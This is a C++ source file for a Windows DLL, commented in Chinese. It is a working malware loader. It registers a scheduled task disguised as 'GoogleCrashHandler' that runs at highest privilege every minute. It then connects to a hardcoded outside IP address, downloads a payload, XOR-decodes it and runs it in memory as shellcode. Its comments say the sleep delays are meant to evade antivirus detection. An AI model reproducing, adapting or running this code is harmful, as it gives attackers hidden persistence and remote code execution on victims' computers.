// dllmain.cpp : 定义 DLL 应用程序的入口点
#include "pch.h"
#include<Windows.h>
#include<WinSock2.h>
#include<cstdlib>
#include<comdef.h>
#include<taskschd.h>
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "ws2_32.lib")

extern "C" _declspec(dllexport) void __cdecl tencent(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
	const int BUF_SIZE = 2048;
	
	WSADATA         wsd; //WSADATA变量
	SOCKET          sHost; // 服务器套接字socket
	SOCKADDR_IN     servAddr; //服务器地址
	CHAR            buf[BUF_SIZE]; // 存放发送的数据缓冲区
	CHAR            bufRecv[BUF_SIZE]; //接收收到的数据缓冲区
	DWORD           dwThreadId;
	HANDLE          hThread;
	DWORD           dwOldProtect;
	DWORD		    retVal; // 返回值

	//初始化COM模型
	HRESULT hr;
	
	hr = CoInitializeEx(NULL, COINIT_MULTITHREADED | COINIT_DISABLE_OLE1DDE);
	if (FAILED(hr)) {
		printf("CoInitializeEx Failed , the error is %d", hr);
	}

	//设置常规COM安全性
	hr = CoInitializeSecurity(
		NULL,
		-1,
		NULL,
		NULL,
		RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
		RPC_C_IMP_LEVEL_IMPERSONATE,
		NULL,
		0,
		NULL);

	if (FAILED(hr)) {
		printf("CoInitializeSecurity Failed , the error is %d", hr);
	}

	//  Create a name for the task.
	// LPCWSTR wszTaskName = L"Microsoft Update";

	//  Get the windows directory and set the path to notepad.exe.
	// wstring wstrExecutablePath = _wgetenv(L"ProgramData");
	// wstrExecutablePath += L"\\svchost.exe";

	//创建ITaskService接口
	ITaskService* pITaskService = NULL;
	CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (LPVOID*)&pITaskService);

	// ITaskService连接
	hr = pITaskService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
	if (FAILED(hr))
	{
		printf("ITaskService Connect Failed , the error is %d", hr);
		pITaskService->Release();
		CoUninitialize();
		return;
	}

	// 创建ITaskFolder接口
	ITaskFolder *pITaskFolder = NULL;

	// 指定创建计划任务的目录
	hr = pITaskService->GetFolder(_bstr_t(L"\\Microsoft"), &pITaskFolder);
	if (FAILED(hr))
	{
		printf("Cannot get Root folder pointer: %x", hr);
		pITaskService->Release();
		CoUninitialize();
		return;
	}

	// 获取指定计划任务目录下的计划任务名
	IRegisteredTask *pIRegisteredTaskTemp;

	hr = pITaskFolder->GetTask(_bstr_t(L"GoogleCrashHandler"), &pIRegisteredTaskTemp);
	if (hr == S_OK) {
		//  If the same task exists, remove it.
		pITaskFolder->DeleteTask(_bstr_t(L"GoogleCrashHandler"), 0);
	}

	//创建ITaskDefinition接口
	ITaskDefinition *pITaskDefinition = NULL;
	hr = pITaskService->NewTask(0, &pITaskDefinition);
	//这里的ITaskService可以进行释放了，后面也不再使用
	pITaskService->Release();
	if (FAILED(hr))
	{
		printf("Failed to CoCreate an instance of the TaskService class: %x", hr);
		pITaskFolder->Release();
		CoUninitialize();
		return;
	}

	//创建IRegistrationInfo接口，设置定时任务的相关信息...
	IRegistrationInfo *pIRegistrationInfo = NULL;
	hr = pITaskDefinition->get_RegistrationInfo(&pIRegistrationInfo);
	pIRegistrationInfo->put_Author(_bstr_t("GoogleCrashHandler"));
	pIRegistrationInfo->Release();
	if (FAILED(hr))
	{
		printf("\nCannot get identification pointer: %x", hr);
		pITaskFolder->Release();
		pITaskDefinition->Release();
		CoUninitialize();
		return;
	}


	//下面全是创建凭据、以什么权限进行运行所需要的...
	IPrincipal *pPrincipal = NULL;
	hr = pITaskDefinition->get_Principal(&pPrincipal);
	if (FAILED(hr))
	{
		printf("\nCannot get principal pointer: %x", hr);
		pITaskFolder->Release();
		pITaskDefinition->Release();
		CoUninitialize();
		return;
	}

	//  Set up principal logon type to interactive logon
	hr = pPrincipal->put_LogonType(TASK_LOGON_INTERACTIVE_TOKEN);
	if (FAILED(hr))
	{
		printf("\nCannot put principal info: %x", hr);
		pITaskFolder->Release();
		pITaskDefinition->Release();
		CoUninitialize();
		return;
	}

	// 以最高的权限运行计划中的任务
	hr = pPrincipal->put_RunLevel(TASK_RUNLEVEL_HIGHEST);
	pPrincipal->Release();
	if (FAILED(hr))
	{
		printf("\nCannot put principal RUNLEVEL_HIGHEST: %x", hr);
		pITaskFolder->Release();
		pITaskDefinition->Release();
		CoUninitialize();
		return;
	}

	//  Create the settings for the task
	ITaskSettings *pSettings = NULL;
	hr = pITaskDefinition->get_Settings(&pSettings);
	if (FAILED(hr))
	{
		printf("\nCannot get settings pointer: %x", hr);
		pITaskFolder->Release();
		pITaskDefinition->Release();
		CoUninitialize();
		return;
	}

	//  Set setting values for the task.  
	hr = pSettings->put_StartWhenAvailable(VARIANT_TRUE);
	pSettings->Release();
	if (FAILED(hr))
	{
		printf("\nCannot put setting information: %x", hr);
		pITaskFolder->Release();
		pITaskDefinition->Release();
		CoUninitialize();
		return;
	}

	// Set the idle settings for the task.
	IIdleSettings *pIdleSettings = NULL;
	hr = pSettings->get_IdleSettings(&pIdleSettings);
	if (FAILED(hr))
	{
		printf("\nCannot get idle setting information: %x", hr);
		pITaskFolder->Release();
		pITaskDefinition->Release();
		CoUninitialize();
		return;

	}

	hr = pIdleSettings->put_WaitTimeout(_bstr_t(L"PT5M"));
	pIdleSettings->Release();
	if (FAILED(hr))
	{
		printf("\nCannot put idle setting information: %x", hr);
		pITaskFolder->Release();
		pITaskDefinition->Release();
		CoUninitialize();
		return;

	}

	//创建 基于时间的触发器
	ITriggerCollection *pITriggerCollection = NULL;
	hr = pITaskDefinition->get_Triggers(&pITriggerCollection);
	if (FAILED(hr)) {
		printf("\nCannot get trigger collection: %x", hr);
		pITaskFolder->Release();
		pITaskDefinition->Release();
		CoUninitialize();
		return;

	}

	//  Add the time trigger to the task.
	ITrigger *pTrigger = NULL;
	hr = pITriggerCollection->Create(TASK_TRIGGER_DAILY, &pTrigger);
	pITriggerCollection->Release();
	if (FAILED(hr))
	{
		printf("\nCannot create trigger: %x", hr);
		pITaskFolder->Release();
		pITaskDefinition->Release();
		CoUninitialize();
		return;

	}

	ITimeTrigger *pTimeTrigger = NULL;
	IDailyTrigger *pDailyTrigger = NULL;
	hr = pTrigger->QueryInterface(IID_IDailyTrigger, (LPVOID*)&pDailyTrigger);
	pTrigger->Release();
	if (FAILED(hr))
	{
		printf("\nQueryInterface call failed for ITimeTrigger: %x", hr);
		pITaskFolder->Release();
		pITaskDefinition->Release();
		CoUninitialize();
		return;

	}

	hr = pDailyTrigger->put_Id(_bstr_t(L"Trigger1"));
	if (FAILED(hr))
		printf("\nCannot put trigger ID: %x", hr);

	//设置触发器从什么时候开始创建 从什么时候开始结束，时间格式为YYYY-MM-DDTHH:MM:SS
	hr = pDailyTrigger->put_StartBoundary(_bstr_t(L"2005-01-01T12:05:00"));
	if (FAILED(hr))
		printf("\nCannot add start boundary to trigger: %x", hr);

	hr = pDailyTrigger->put_EndBoundary(_bstr_t(L"2099-01-01T12:05:00"));
	if (FAILED(hr))
		printf("\nCannot put end boundary on trigger: %x", hr);

	//设置每天中 运行的间隔时间
	hr = pDailyTrigger->put_DaysInterval((short)1);
	if (FAILED(hr))
	{
		printf("\nCannot add put_DaysInterval to trigger: %x", hr);
		pITaskFolder->Release();
		pTimeTrigger->Release();
		pITaskDefinition->Release();
		CoUninitialize();
		return;
	}

	// Add a repetition to the trigger so that it repeats five times.
	IRepetitionPattern *pRepetitionPattern = NULL;
	hr = pDailyTrigger->get_Repetition(&pRepetitionPattern);
	pDailyTrigger->Release();
	if (FAILED(hr))
	{
		printf("\nCannot get repetition pattern: %x", hr);
		pITaskFolder->Release();
		pITaskDefinition->Release();
		CoUninitialize();
		return;

	}

	hr = pRepetitionPattern->put_Duration(_bstr_t(L"PT24H"));
	if (FAILED(hr))
	{
		printf("\nCannot put repetition duration: %x", hr);
		pITaskFolder->Release();
		pRepetitionPattern->Release();
		pITaskDefinition->Release();
		CoUninitialize();
		return;

	}

	// 运行的间隔时间
	hr = pRepetitionPattern->put_Interval(_bstr_t(L"PT1M"));
	pRepetitionPattern->Release();
	if (FAILED(hr))
	{
		printf("\nCannot put repetition interval: %x", hr);
		pITaskFolder->Release();
		pITaskDefinition->Release();
		CoUninitialize();
		return;

	}

	// 通过IActionCollection接口设置要执行的动作
	IActionCollection* pIActionCollection = NULL;
	hr = pITaskDefinition->get_Actions(&pIActionCollection);
	if (FAILED(hr))
	{
		printf("\nCannot get Task collection pointer: %x", hr);
		pITaskFolder->Release();
		pITaskDefinition->Release();
		CoUninitialize();
		return;

	}

	IAction* pIAction = NULL;
	hr = pIActionCollection->Create(TASK_ACTION_EXEC, &pIAction);
	pIActionCollection->Release();
	if (FAILED(hr)) {
		printf("\nCannot create the action: %x", hr);
		pITaskFolder->Release();
		pITaskDefinition->Release();
		CoUninitialize();
		return;

	}

	IExecAction* pExecAction = NULL;
	hr = pIAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
	pIAction->Release();
	if (FAILED(hr))
	{
		printf("\nQueryInterface call failed for IExecAction: %x", hr);
		pITaskFolder->Release();
		pITaskDefinition->Release();
		CoUninitialize();
		return;

	}
	/*
	TCHAR szFileName[] = TEXT("\\tencent.dll");
	TCHAR szSaveFilePath[MAX_PATH];
	TCHAR szFileBuffer[MAX_PATH];
	ZeroMemory(szSaveFilePath, MAX_PATH);
	GetEnvironmentVariable(TEXT("TMP"), szSaveFilePath, MAX_PATH); //  "c:\\TEMP"
	wcscat(szSaveFilePath, szFileName); // "c:\\TEMP\\tencent.dll"
	ZeroMemory(szFileBuffer, MAX_PATH);
	wcscat(szFileBuffer, L" "); // " "
	wcscat(szFileBuffer, szSaveFilePath); // " c:\\temp\\tencent.dll"
	wcscat(szFileBuffer, L",tencent"); // " c:\\temp\\tencent.dll,tencent"
	*/

	//  Set the path of the executable to notepad.exe.
	hr = pExecAction->put_Path(_bstr_t(L"C:\\Programdata\\GoogleCrashHandler.exe"));
	//hr = pExecAction->put_Path(_bstr_t(szFileBuffer));
	pExecAction->Release();
	if (FAILED(hr))
	{
		printf("\nCannot put action path: %x", hr);
		pITaskFolder->Release();
		pITaskDefinition->Release();
		CoUninitialize();
		return;

	}

	IRegisteredTask* pIRegisteredTask = NULL;
	hr = pITaskFolder->RegisterTaskDefinition(
		_bstr_t(L"GoogleCrashHandler"),
		pITaskDefinition,
		TASK_CREATE_OR_UPDATE,
		_variant_t(),
		_variant_t(),
		TASK_LOGON_INTERACTIVE_TOKEN,
		_variant_t(L""),
		&pIRegisteredTask);

	if (FAILED(hr))
	{
		printf("\nError saving the Task : %x", hr);
		pITaskFolder->Release();
		pITaskDefinition->Release();
		CoUninitialize();
		return;

	}
#ifdef DEBUG
	printf("\nTask successfully registered.");
#endif // DEBUG

	//  Clean up.
	pITaskFolder->Release();
	pITaskDefinition->Release();
	pIRegisteredTask->Release();
	//MessageBox(0, L"ooo!", 0, 0);
	CoUninitialize();

	//初始化套结字动态库
	if (WSAStartup(MAKEWORD(2, 2), &wsd) != 0)
	{
		return;
	}

	//创建套接字 IPV4  可靠的，双向的类型服务提供商选择
	sHost = socket(AF_INET, SOCK_STREAM, 0);
	if (INVALID_SOCKET == sHost)
	{
		//cout << "Socket Failed!" << endl;
		WSACleanup();
		return;
	}

	//设置服务器的地址
	servAddr.sin_family = AF_INET; //指定IPV4
	servAddr.sin_addr.s_addr = inet_addr("47.103.122.118"); // 指定服务器的地址
	servAddr.sin_port = htons((short)atoi("7777")); // 指定服务器的端口

	// 套接字 sockaddr的指针，也就是地址 第三个参数为SOCKADDR_IN结构体的大小
	retVal = connect(sHost, (LPSOCKADDR)&servAddr, sizeof(servAddr));

	//判断是否连接成功
	if (SOCKET_ERROR == retVal)
	{
		closesocket(sHost);
		WSACleanup();
		return;
	}

	// buf指向的地址用0来填充
	ZeroMemory(buf, BUF_SIZE);
	// bufRevc指向的地址用0来填充
	ZeroMemory(bufRecv, BUF_SIZE);

	//给ok两个字节的字符串复制给buf区段，其主要作用就是跟服务端进行认证
	strcpy(buf, "zpchcbd");

	//send的返回值
	retVal = send(sHost, buf, strlen(buf), 0);

	//判断是否发送成功
	if (SOCKET_ERROR == retVal)
	{
		//cout << "Send Failed!" << endl;
		closesocket(sHost);
		WSACleanup();
		return;
	}

	//延迟两秒起到免杀绕过的效果
	Sleep(2000);

	//bufRecv缓冲区接收 服务端发送来的数据
	recv(sHost, bufRecv, BUF_SIZE, 0);

	Sleep(4000);
	closesocket(sHost);
	WSACleanup();

	//采取倾旋的方式来进行异或解密
	for (int i = 0; i < sizeof(bufRecv); i++) {
		//Sleep(50);
		_InterlockedXor8(bufRecv + i, 10);
	}

	//下面就是开辟内存存储shellcode 创建线程进行执行
	CHAR* tttt = (CHAR*)VirtualAlloc(
		NULL,
		sizeof(bufRecv),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE // 只申请一个物理页可读可写
	);

	// 复制内存到执行shellcode的地方去
	CopyMemory(tttt, bufRecv, BUF_SIZE);

	// VirtualProtect改变它的属性 -> 可执行
	VirtualProtect(tttt, BUF_SIZE, PAGE_EXECUTE, &dwOldProtect);

	//开始执行要执行的shellcode
	hThread = CreateThread(
		NULL, // 安全描述符
		0, // 栈的大小
		(PTHREAD_START_ROUTINE)tttt, // 函数
		NULL, // 参数
		0, // 线程标志
		&dwThreadId // 线程ID
	);

	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
}


BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}